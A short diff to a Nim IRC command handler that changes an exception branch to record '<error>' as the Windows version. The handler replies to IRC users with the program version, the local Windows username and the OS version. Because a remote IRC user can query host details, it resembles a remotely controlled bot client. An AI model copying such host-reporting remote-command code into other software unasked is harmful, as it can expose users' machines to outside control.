@@ -457,7 +457,7 @@ proc cmdh_handle*(event:IrcEvent, client:AsyncIrc):void {.thread.} =
             output = output.strip(chars={'\r','\n'})
             win_ver = output
         except:
-            discard
+            win_ver = "<error>"
         discard client.privmsg(event.origin, "heyyy v" & $current_version & " as " & getEnv("USERNAME") & " windows version: " & win_ver)
     of "!lag": discard client.privmsg(event.origin, formatFloat(client.getLag))
     of "!excessFlood":
